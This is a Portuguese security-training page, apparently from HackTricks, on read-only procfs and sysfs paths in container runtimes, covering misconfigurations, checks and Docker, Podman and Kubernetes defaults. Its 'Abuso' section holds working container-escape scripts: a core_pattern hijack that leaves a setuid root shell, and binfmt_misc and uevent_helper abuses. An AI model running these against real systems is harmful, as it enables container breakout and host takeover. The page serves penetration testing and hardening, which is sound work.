# Caminhos do Sistema Somente Leitura

{{#include ../../../../banners/hacktricks-training.md}}

Caminhos do sistema somente leitura são uma proteção separada de caminhos mascarados. Em vez de ocultar um caminho completamente, o runtime o expõe, mas o monta como somente leitura. Isso é comum em locais selecionados do procfs e sysfs onde o acesso de leitura pode ser aceitável ou operacionalmente necessário, mas gravações seriam perigosas demais.

O objetivo é simples: muitas interfaces do kernel se tornam muito mais perigosas quando são graváveis. Um mount somente leitura não elimina todo o valor de reconhecimento, mas impede que uma carga comprometida modifique os arquivos voltados ao kernel por meio daquele caminho.

## Operação

Runtimes frequentemente marcam partes da visão `proc/sys` como somente leitura. Dependendo do runtime e do host, isso pode incluir caminhos como:

- `/proc/sys`
- `/proc/sysrq-trigger`
- `/proc/irq`
- `/proc/bus`

A lista real varia, mas o modelo é o mesmo: permitir visibilidade onde necessário, negar mutação por padrão.

## Laboratório

Inspecione a lista de caminhos somente leitura declarada pelo Docker:
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'
```
Inspecione a visualização montada de proc/sys de dentro do container:
```bash
mount | grep -E '/proc|/sys'
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head
find /sys -maxdepth 3 -writable 2>/dev/null | head
```
## Impacto na Segurança

Caminhos do sistema somente leitura reduzem uma grande classe de abuso com impacto no host. Mesmo quando um atacante pode inspecionar procfs ou sysfs, a incapacidade de escrever nesses locais elimina muitos caminhos de modificação direta envolvendo parâmetros do kernel, manipuladores de crash, auxiliares de carregamento de módulos ou outras interfaces de controle. A exposição não desaparece, mas a transição de divulgação de informação para influência sobre o host torna-se mais difícil.

## Misconfigurações

Os principais erros são desenmascarar ou remontar caminhos sensíveis como read-write, expor o conteúdo proc/sys do host diretamente com writable bind mounts, ou usar modos privilegiados que efetivamente contornam os defaults de runtime mais seguros. Em Kubernetes, `procMount: Unmasked` e workloads privilegiados frequentemente andam junto com proteção de proc mais fraca. Outro erro operacional comum é presumir que, porque o runtime normalmente monta esses caminhos como read-only, todas as workloads ainda estão herdando esse padrão.

## Abuso

Se a proteção for fraca, comece procurando por entradas proc/sys graváveis:
```bash
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50   # Find writable kernel tunables reachable from the container
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50        # Find writable sysfs entries that may affect host devices or kernel state
```
Quando existem entradas graváveis, caminhos de acompanhamento de alto valor incluem:
```bash
cat /proc/sys/kernel/core_pattern 2>/dev/null        # Crash handler path; writable access can lead to host code execution after a crash
cat /proc/sys/kernel/modprobe 2>/dev/null            # Kernel module helper path; useful to evaluate helper-path abuse opportunities
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null      # Whether binfmt_misc is active; writable registration may allow interpreter-based code execution
cat /proc/sys/vm/panic_on_oom 2>/dev/null            # Global OOM handling; useful for evaluating host-wide denial-of-service conditions
cat /sys/kernel/uevent_helper 2>/dev/null            # Helper executed for kernel uevents; writable access can become host code execution
```
What these commands can reveal:

- Entradas graváveis em `/proc/sys` frequentemente significam que o container pode modificar o comportamento do kernel do host em vez de apenas inspecioná-lo.
- `core_pattern` é especialmente importante porque um valor host-facing gravável pode ser transformado em um caminho de execução de código no host ao provocar o crash de um processo depois de definir um pipe handler.
- `modprobe` revela o helper usado pelo kernel para fluxos relacionados a module-loading; é um alvo clássico de alto valor quando gravável.
- `binfmt_misc` indica se é possível o registro de interpretadores customizados. Se o registro for gravável, isso pode se tornar um execution primitive em vez de apenas um information leak.
- `panic_on_oom` controla uma decisão do kernel host-wide e pode, portanto, transformar exaustão de recursos em host denial of service.
- `uevent_helper` é um dos exemplos mais claros de um writable sysfs helper path que produz execução em host-context.

Achados interessantes incluem writable host-facing proc knobs ou entradas sysfs que normalmente deveriam ser read-only. Nesse ponto, o workload passou de uma visão de container restrita para uma influência significativa sobre o kernel.

### Full Example: `core_pattern` Host Escape

Se `/proc/sys/kernel/core_pattern` for gravável de dentro do container e apontar para a host kernel view, pode ser abusado para executar um payload após um crash:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Se o caminho realmente alcança o kernel do host, o payload é executado no host e deixa um shell setuid para trás.

### Exemplo completo: Registro `binfmt_misc`

Se `/proc/sys/fs/binfmt_misc/register` for gravável, um registro de interpretador personalizado pode produzir execução de código quando o arquivo correspondente for executado:
```bash
mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc
cat <<'EOF' > /tmp/h
#!/bin/sh
id > /tmp/binfmt.out
EOF
chmod +x /tmp/h
printf ':hack:M::HT::/tmp/h:\n' > /proc/sys/fs/binfmt_misc/register
printf 'HT' > /tmp/test.ht
chmod +x /tmp/test.ht
/tmp/test.ht
cat /tmp/binfmt.out
```
Em um `binfmt_misc` gravável voltado ao host, o resultado é execução de código no caminho do interpretador acionado pelo kernel.

### Exemplo Completo: `uevent_helper`

Se `/sys/kernel/uevent_helper` for gravável, o kernel pode invocar um helper no caminho do host quando um evento correspondente for acionado:
```bash
cat <<'EOF' > /tmp/evil-helper
#!/bin/sh
id > /tmp/uevent.out
EOF
chmod +x /tmp/evil-helper
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$overlay/tmp/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /tmp/uevent.out
```
A razão pela qual isso é tão perigoso é que o helper path é resolvido a partir da perspectiva do sistema de arquivos do host em vez de a partir de um contexto seguro apenas do container.

## Verificações

Essas verificações determinam se a exposição de procfs/sysfs é somente leitura onde esperado e se a workload ainda consegue modificar interfaces sensíveis do kernel.
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'   # Runtime-declared read-only paths
mount | grep -E '/proc|/sys'                                      # Actual mount options
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head           # Writable procfs tunables
find /sys -maxdepth 3 -writable 2>/dev/null | head                # Writable sysfs paths
```
O que é interessante aqui:

- Uma carga de trabalho reforçada normal deve expor muito poucas entradas graváveis em /proc/sys.
- Caminhos `/proc/sys` graváveis costumam ser mais importantes do que o acesso somente leitura.
- Se o runtime diz que um caminho é somente leitura mas, na prática, é gravável, revise cuidadosamente propagação de montagem, montagens bind e configurações de privilégios.

## Padrões do runtime

| Runtime / platform | Estado padrão | Comportamento padrão | Enfraquecimento manual comum |
| --- | --- | --- | --- |
| Docker Engine | Ativado por padrão | Docker define uma lista padrão de caminhos somente leitura para entradas sensíveis do proc | expor montagens do host proc/sys, `--privileged` |
| Podman | Ativado por padrão | Podman aplica caminhos padrão somente leitura a menos que explicitamente relaxados | `--security-opt unmask=ALL`, montagens amplas do host, `--privileged` |
| Kubernetes | Herda padrões do runtime | Usa o modelo subjacente de caminhos somente leitura do runtime a menos que enfraquecido por configurações do Pod ou montagens do host | `procMount: Unmasked`, cargas de trabalho privilegiadas, montagens do host proc/sys com permissão de escrita |
| containerd / CRI-O under Kubernetes | Padrão do runtime | Normalmente depende dos padrões OCI/runtime | igual à linha do Kubernetes; alterações diretas na configuração do runtime podem enfraquecer o comportamento |

O ponto principal é que caminhos do sistema somente leitura normalmente estão presentes como padrão do runtime, mas são fáceis de contornar com modos privilegiados ou montagens bind do host.
{{#include ../../../../banners/hacktricks-training.md}}
